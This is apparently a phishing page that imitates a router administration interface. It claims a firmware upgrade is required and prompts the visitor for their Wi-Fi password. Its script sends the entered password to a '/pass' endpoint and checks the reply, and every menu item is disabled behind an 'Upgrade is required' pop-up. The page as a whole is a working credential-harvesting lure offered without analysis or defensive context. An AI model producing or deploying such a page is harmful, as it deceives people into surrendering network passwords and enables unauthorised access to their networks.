<!DOCTYPE html>
<html lang="en">
<head>
  <title>Router Configuration Page</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="/static/bootstrap.min.css">
  <link rel="stylesheet" href="/static/font-awesome-4.7.0/css/font-awesome.min.css">
  <script src="/static/jquery.min.js"></script>
  <script src="/static/bootstrap.min.js"></script>

  <style type="text/css">


    html,
    body {
          height: 100%;
        }

        #wrap {
          min-height: 100%;
          height: auto !important;
          height: 100%;
          margin: 0 auto -60px;
        }

        #push,
        #footer {
          height: 60px;
        }
        #footer {
          background-color: #f5f5f5;
        }

        @media (max-width: 767px) {
          #footer {
            margin-left: -20px;
            margin-right: -20px;
            padding-left: 20px;
            padding-right: 20px;
          }
        }

    img {
        width: auto;
        max-width: 100%;
        height: auto;
    }
    .isa_info {
        color: #9F6000;
        background-color: #FEEFB3
    }
    .isa_info i {
        margin:1px 3px;
        font-size:18px;
        vertical-align:middle;
    }

    @media (max-width: 767px) {
      .modal {
        padding-right: 0 !important;
        text-align: center;
      }
      
      .modal:before {
        content: '';
        display: inline-block;
        height: 100%;
        vertical-align: middle;
        margin-right: -4px;
      }
      
      .modal-dialog {
        display: inline-block;
        text-align: left;
        vertical-align: middle;
        width: 90%;
        max-width: 500px;
        margin: 30px auto;
      }
      
      .modal-content {
        max-height: 80vh;
        overflow-y: auto;
      }
    }
    
    @media (max-width: 480px) {
      .modal-dialog {
        width: 95%;
        margin: 20px auto;
      }
      
      .modal-content {
        max-height: 85vh;
      }
    }
  </style>

</head>

<body>

  <nav class="navbar navbar-inverse" style="background:RoyalBlue;margin-top:2em;">
    <div class="container-fluid">
      <div class="navbar-header">
        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#myNavbar">
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
        </button>
      </div>
      <div class="collapse navbar-collapse" id="myNavbar">
        <ul class="nav navbar-nav">
          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
              data-toggle="dropdown" href="#" style="color:white">Setup <span class="caret"></span></a>
            <ul class="dropdown-menu">
              <li><a href="#">Basic Setup</a></li>
              <li><a href="#">DDNS</a></li>
              <li><a href="#">MAC Address</a></li>
              <li><a href="#">Advanced Routing</a></li>
            </ul>
          </li>
          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
              data-toggle="dropdown" href="#" style="color:white">Wireless <span class="caret"></span></a>
            <ul class="dropdown-menu">
              <li><a href="#">Basic Wireless Settings</a></li>
              <li><a href="#">Wireless Security</a></li>
              <li><a href="#">Wireless MAC Filter</a></li>
              <li><a href="#">Advanced Wireless Settings</a></li>
            </ul>
          </li>
          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
              data-toggle="dropdown" href="#" style="color:white">Security <span class="caret"></span></a>
            <ul class="dropdown-menu">
              <li><a href="#">Firewall</a></li>
              <li><a href="#">VPN</a></li>
            </ul>
          </li>
          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
              data-toggle="dropdown" href="#" style="color:white">Access Restriction <span class="caret"></span></a>
            <ul class="dropdown-menu">
              <li><a href="#">Internet Access</a></li>
            </ul>
          </li>
          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
              data-toggle="dropdown" href="#" style="color:white">Administration <span class="caret"></span></a>
            <ul class="dropdown-menu">
              <li><a href="#">Management</a></li>
              <li><a href="#">Log</a></li>
              <li><a href="#">Diagnostics</a></li>
              <li><a href="#">Factory Defaults</a></li>
              <li><a href="#">Config Manegements</a></li>
            </ul>
          </li>
          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
              data-toggle="dropdown" href="#" style="color:white">Status <span class="caret"></span></a>
            <ul class="dropdown-menu">
              <li><a href="#">Router</a></li>
              <li><a href="#">Local Network</a></li>
              <li><a href="#">Wireless</a></li>
              <li><a href="#">Advanced Routing</a></li>
            </ul>
          </li>
        </ul>
      </div>
    </div>
  </nav>
  <div class="container">
	   <div class="col-sm">
       <h2 class="text-center" style="color:CornflowerBlue">Firmware Upgrade</h2>
    	 <p class="lead">Your router has a firmware upgrade available. Please accept the terms and conditions to proceed.</p>
     </div>
    <form>
      <div class="form-group">
        <label for="comment">Terms And Conditions:</label>
        <textarea readonly class="form-control" rows="5" id="comment">
       THIS SOFTWARE IS PROVIDED AS IS AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
        </textarea>
        <div class="checkbox">
          <label><input type="checkbox" id="check-box">I Agree</label>
        </div>
      </div>
      <div class="form-group-has-feedback" id="psk_field">
          <label for="pwd">Please enter your wifi password:</label>
          <input class="form-control" type="password" id="pwd">
      </div>
      <div class="container text-center" style="margin-top: 40px;">
        <div class="isa_info" id="pw_status" align="left">
        </div>
        <button class="btn btn-primary" id="btn" style="margin-top: 10px;">Start Upgrade</button>
      </div>
    </form>
    <div id="push"></div>
  </div>
  <footer class="footer">
    <div class="container text-center">
      <p class="text-muted"> <script>document.write(new Date().getFullYear())</script>, All Rights Reserved.</p>
    </div>
  </footer>
  <div class="modal fade" id="short-password-modal">
    <div class="modal-dialog">
      <div class="modal-content">
        <div class="modal-header">
          <h5 class="modal-title">Password Too Short</h5>
          <button type="button" class="close" data-dismiss="modal">&times;</button>
        </div>
        <div class="modal-body">
          Password must be at least 8 characters.
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-primary" data-dismiss="modal">OK</button>
        </div>
      </div>
    </div>
  </div>

  <div class="modal fade" id="wrong-password-modal">
    <div class="modal-dialog">
      <div class="modal-content">
        <div class="modal-header">
          <h5 class="modal-title">Wrong Password</h5>
          <button type="button" class="close" data-dismiss="modal">&times;</button>
        </div>
        <div class="modal-body">
          The password is incorrect. Please try again.
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-primary" data-dismiss="modal">Try Again</button>
        </div>
      </div>
    </div>
  </div>

  <div class="modal fade" id="update-only" role="dialog">
    <div class="modal-dialog modal-sm">
      <div class="modal-content">
        <div class="modal-header">
          <button type="button" class="close" data-dismiss="modal">&times;</button>
          <h4 class="modal-title">Information</h4>
        </div>
        <div class="modal-body">
          <p>Upgrade is required.</p>
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
        </div>
      </div>
    </div>
  </div>

  <script>
  const flsk_url = "/pass"

  $("#btn").on("click", function(e) {
      e.preventDefault();

      var pass = document.getElementById("pwd").value;

      if (pass.length < 8) {
          $('#short-password-modal').modal('show');
          return;
      }

      console.log("Testing password:", pass);

      function handleResponse(data) {
          console.log("Response:", data);
          if (data.status == "All good") {
              window.location = "/upgrading.html";
          } else if (data.status == "notgood") {
              $('#wrong-password-modal').modal('show');
              document.getElementById("pwd").value = "";
              $('#wrong-password-modal').on('hidden.bs.modal', function() {
                  document.getElementById("pwd").focus();
              });
          }
      }

      fetch(flsk_url, { 
          method: 'POST', 
          headers: new Headers({'Content-Type': 'application/x-www-form-urlencoded'}), 
          body: 'pass=' + pass
      })
      .then(response => response.json())
      .then(data => handleResponse(data))
      .catch(error => console.error('Error!', error.message));
  });

  $("#pwd").keypress(function(e) {
      if (e.which == 13) { 
          $("#btn").click();
      }
  });
  </script>
</body>
</html>
